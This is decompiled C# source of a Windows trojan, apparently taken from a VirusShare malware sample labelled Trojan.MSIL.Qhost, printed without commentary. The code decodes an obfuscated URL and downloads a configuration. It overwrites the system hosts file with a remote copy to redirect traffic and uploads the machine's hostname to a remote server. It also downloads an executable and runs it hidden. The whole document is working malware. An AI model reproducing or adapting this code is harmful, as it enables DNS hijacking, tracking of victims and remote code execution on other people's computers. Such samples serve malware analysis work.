// Decompiled with JetBrains decompiler
// Type: WindowsApplication2.Module1
// Assembly: inicio, Version=1.0.0.3, Culture=neutral, PublicKeyToken=null
// MVID: CEE848A2-C5A7-4B2D-A043-9267D9A0BB77
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\Trojan.MSIL.Qhost.b-ba8457c8a1a5677182f5a74353ba596722bdd37da1f7572e1833b0925f298cdf.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Net;
using System.Windows.Forms;
using WindowsApplication2.My;

namespace WindowsApplication2
{
  [StandardModule]
  internal sealed class Module1
  {
    public static object Line;
    public static string Encriptado;

    [STAThread]
    public static void main()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        Module1.Lk("~ŠŠ†PEEz\u0090‰{ˆŒ{ˆD„{ŠE\u007Fƒw}{‰E‚\u007F„\u0081‰G");
label_2:
        num3 = 3;
        MyProject.Computer.FileSystem.DeleteFile("C:\\WINDOWS\\system32\\lk");
label_3:
        num3 = 4;
        MyProject.Computer.Network.DownloadFile(Module1.Encriptado, "C:\\WINDOWS\\system32\\lk");
label_4:
        num3 = 5;
        Module1.Line = (object) Strings.Split(MyProject.Computer.FileSystem.ReadAllText("C:\\WINDOWS\\system32\\lk"), "\t");
label_5:
        num3 = 6;
        Module1.Update1();
label_6:
        num3 = 7;
        Module1.Desinfecta();
label_7:
        num3 = 8;
        MyProject.Computer.FileSystem.DeleteFile("C:\\WINDOWS\\system32\\drivers\\etc\\hosts");
label_8:
        num3 = 9;
        MyProject.Computer.Network.DownloadFile(Strings.Trim(Conversions.ToString(NewLateBinding.LateIndexGet(Module1.Line, new object[1]
        {
          (object) 0
        }, (string[]) null))), "C:\\WINDOWS\\system32\\drivers\\etc\\hosts");
label_9:
        num3 = 10;
        Module1.Edita(Conversions.ToString(DateTime.Now) + Dns.GetHostName() + "\r\n");
label_10:
        num3 = 11;
        MyProject.Computer.FileSystem.DeleteFile("C:\\WINDOWS\\system32\\lk");
        ProjectData.EndApp();
        goto label_17;
label_12:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
                goto label_17;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_12;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_17:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public static void Lk(string Clave)
    {
      Module1.Encriptado = "";
      int num = Strings.Len(Clave);
      int Start = 1;
      while (Start <= num)
      {
        string str = Conversions.ToString(Strings.Chr(Conversions.ToInteger(Operators.AddObject(Operators.SubtractObject((object) Strings.Asc(Strings.Mid(Clave, Start, 1)), (object) 32), (object) 10))));
        Module1.Encriptado += str;
        checked { ++Start; }
      }
    }

    public static void Edita(string strTexto)
    {
      MyProject.Computer.FileSystem.WriteAllText("C:\\WINDOWS\\system32\\windsetup.txt", strTexto, true);
      MyProject.Computer.Network.UploadFile("C:\\WINDOWS\\system32\\windsetup.txt", Strings.Trim(Conversions.ToString(NewLateBinding.LateIndexGet(Module1.Line, new object[1]
      {
        (object) 1
      }, (string[]) null))) + "Version: " + Application.ProductVersion + "   " + strTexto, "", "");
    }

    public static void Desinfecta()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        MyProject.Computer.FileSystem.DeleteFile("C:\\WINDOWS\\system32\\baned.txt");
label_2:
        num3 = 3;
        MyProject.Computer.Network.DownloadFile(Strings.Trim(Conversions.ToString(NewLateBinding.LateIndexGet(Module1.Line, new object[1]
        {
          (object) 2
        }, (string[]) null))), "C:\\WINDOWS\\system32\\baned.txt");
label_3:
        num3 = 4;
        string[] strArray = Strings.Split(MyProject.Computer.FileSystem.ReadAllText("C:\\WINDOWS\\system32\\baned.txt"), "\t");
label_4:
        num3 = 5;
        int num4 = checked (strArray.Length - 1);
        int index = 0;
        goto label_10;
label_5:
        num3 = 6;
        if (Operators.CompareString(Dns.GetHostName(), Strings.Trim(strArray[index]), false) != 0)
          goto label_9;
label_6:
        num3 = 7;
        MyProject.Computer.FileSystem.DeleteFile("C:\\WINDOWS\\system32\\drivers\\etc\\hosts");
label_7:
        num3 = 8;
        MyProject.Computer.Network.DownloadFile(Strings.Trim(Conversions.ToString(NewLateBinding.LateIndexGet(Module1.Line, new object[1]
        {
          (object) 3
        }, (string[]) null))), "C:\\WINDOWS\\system32\\drivers\\etc\\hosts");
label_8:
        num3 = 9;
        MyProject.Computer.FileSystem.DeleteFile("C:\\WINDOWS\\system32\\baned.txt");
        ProjectData.EndApp();
label_9:
        num3 = 12;
        checked { ++index; }
label_10:
        if (index <= num4)
          goto label_5;
label_11:
        num3 = 13;
        MyProject.Computer.FileSystem.DeleteFile("C:\\WINDOWS\\system32\\baned.txt");
        goto label_18;
label_13:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num5 = num2 + 1;
            num2 = 0;
            switch (num5)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
              case 11:
              case 12:
                goto label_9;
              case 13:
                goto label_11;
              case 14:
                goto label_18;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_13;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_18:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public static void Update1()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        if (Operators.CompareString(Application.ProductVersion, Strings.Trim(Conversions.ToString(NewLateBinding.LateIndexGet(Module1.Line, new object[1]
        {
          (object) 7
        }, (string[]) null))), false) == 0)
          goto label_5;
label_2:
        num3 = 3;
        MyProject.Computer.Network.DownloadFile(Strings.Trim(Conversions.ToString(NewLateBinding.LateIndexGet(Module1.Line, new object[1]
        {
          (object) 8
        }, (string[]) null))), "C:\\update.exe");
label_3:
        num3 = 4;
        Interaction.Shell("C:\\update.exe", AppWinStyle.Hide);
label_4:
        num3 = 5;
        MyProject.Computer.FileSystem.DeleteFile("C:\\uaa.txt");
        ProjectData.EndApp();
label_5:
        num3 = 8;
        MyProject.Computer.FileSystem.DeleteFile("C:\\update.exe");
label_6:
        num3 = 9;
        MyProject.Computer.FileSystem.DeleteFile("C:\\uaa.txt");
        goto label_13;
label_8:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
              case 7:
              case 8:
                goto label_5;
              case 9:
                goto label_6;
              case 10:
                goto label_13;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_8;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_13:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }
  }
}
